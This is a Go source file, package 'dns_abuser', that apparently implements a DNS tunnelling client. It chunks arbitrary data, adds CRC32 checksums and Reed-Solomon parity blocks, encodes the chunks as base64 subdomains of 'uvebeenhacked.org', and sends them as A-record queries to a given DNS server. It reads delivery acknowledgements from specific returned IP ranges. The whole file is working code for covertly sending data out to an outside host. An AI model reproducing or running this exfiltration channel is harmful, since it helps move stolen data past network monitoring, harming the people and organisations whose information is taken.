package dns_abuser

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"github.com/klauspost/reedsolomon"
	"github.com/miekg/dns"
	"hash/crc32"
	"math"
	"math/rand"
	"strconv"
	"strings"
	"time"
)

func SendInitialBlock(count uint32, host string, retry int) ([]byte, error) {
	parityBlocksCount := uint32(math.Ceil(float64(count) * 0.25))
	data := make([]byte, 1+4+4+4)

	timestamp := uint32(time.Now().Unix()) & uint32(rand.Intn(2147483647))
	id := make([]byte, 4)

	binary.BigEndian.PutUint32(id, timestamp)
	binary.BigEndian.PutUint32(data[1:5], timestamp)
	binary.BigEndian.PutUint32(data[5:9], count)
	binary.BigEndian.PutUint32(data[9:13], parityBlocksCount)

	data = appendChecksum(data)
	subdomain := encodeToBase64(data)

	var err error
	for ret := 0; ret < retry; ret++ {
		err = sendRequest(subdomain, host, data[0])
		_ = subdomain
		if err != nil {
			continue
		}
		break
	}
	if err != nil {
		return nil, err
	}

	return id, nil
}

func SendData(id, d []byte, blockLength, blockNum int, host string, retry int) error {
	data := make([]byte, 1+blockLength+4)
	copy(data[1+4:len(d)+1+4], d)
	data[0] = uint8(blockNum)
	copy(data[1:5], id)

	data = appendChecksum(data)

	subdomain := encodeToBase64(data)
	var err error
	for ret := 0; ret < retry; ret++ {
		err = sendRequest(subdomain, host, data[0])
		if err != nil {
			continue
		}
		break
	}
	if err != nil {
		return err
	}

	return nil
}

func SendReedSolomonBlocks(id, data []byte, estimatedSize int, host string) error {
	dataBlockCount := int(math.Ceil(float64(len(data)) / float64(estimatedSize)))
	blockLength := int(math.Ceil(float64(len(data)) / float64(dataBlockCount)))
	parityBlocksCount := int(math.Ceil(float64(dataBlockCount) * 0.25))

	blocks, err := reedSolomon(data, blockLength, dataBlockCount, parityBlocksCount)
	if err != nil {
		return err
	}

	for i := 0; i < len(blocks); i++ {
		subdomain := encodeToBase64(append([]byte{uint8(dataBlockCount + 1 + i)}, append(id, blocks[i]...)...))
		err = sendRequest(subdomain, host, uint8(dataBlockCount+1+i))
		if err != nil {
			return err
		}
	}

	return nil
}

func encodeToBase64(data []byte) string {
	sub := base64.URLEncoding.EncodeToString(data)
	var subdomain string
	for i, r := range sub {
		subdomain += string(r)
		if (i+1)%60 == 0 && i != len(sub)-1 {
			subdomain += "."
		}
	}
	return subdomain
}

func appendChecksum(d []byte) []byte {
	data := make([]byte, len(d)+4)
	copy(data[:len(d)], d)

	crc := crc32.ChecksumIEEE(d)
	binary.BigEndian.PutUint32(data[len(d):], crc)

	return data
}

func reedSolomon(data []byte, l, n, m int) ([][]byte, error) {

	blocks := make([][]byte, n+m)
	for i := 0; i < len(blocks); i++ {
		blocks[i] = make([]byte, l)
	}
	for i := 0; i < len(data); i++ {
		blockIndex := i / l
		byteIndex := i % l
		blocks[blockIndex][byteIndex] = data[i]
	}

	enc, err := reedsolomon.New(n, m)
	if err != nil {
		return nil, err
	}
	err = enc.Encode(blocks)
	if err != nil {
		return nil, err
	}

	return blocks[n:], nil
}

func sendRequest(sub, host string, num uint8) error {
	domain := fmt.Sprintf("%s.uvebeenhacked.org.", sub)

	fmt.Printf("Send block %d: %s\n", num, domain)

	// Erstellen einer neuen DNS-Nachricht
	m := new(dns.Msg)
	m.SetQuestion(domain, dns.TypeA) // A-Record-Abfrage

	// DNS-Client konfigurieren und Ziel-DNS-Server festlegen
	client := new(dns.Client)
	client.Timeout = 5 * time.Second

	// Senden der Anfrage an den festgelegten DNS-Server
	response, _, err := client.Exchange(m, fmt.Sprintf("%s:%d", host, 53))
	if err != nil {
		return err
	}

	// Verarbeiten der Antwort
	for _, ans := range response.Answer {
		if aRecord, ok := ans.(*dns.A); ok {
			fmt.Printf("Antwort: %s -> %s\n", domain, aRecord.A.String())
			answer := strings.Split(aRecord.A.String(), ".")
			if len(answer) != 4 {
				return fmt.Errorf("recieved ip has incorrect format")
			}
			if answer[0] == "85" && answer[1] == "143" && answer[2] == "80" {
				block, err := strconv.Atoi(answer[3])
				if err != nil {
					return err
				}
				fmt.Printf("Block %d ok\n", block)
			} else if answer[0] == "47" && answer[1] == "81" && answer[2] == "64" {
				block, err := strconv.Atoi(answer[3])
				if err != nil {
					return err
				}
				fmt.Printf("Block %d incorrect\n", block)
			} else {
				return fmt.Errorf("recieved ip not recongnisable")
			}
		}
	}

	return nil
}
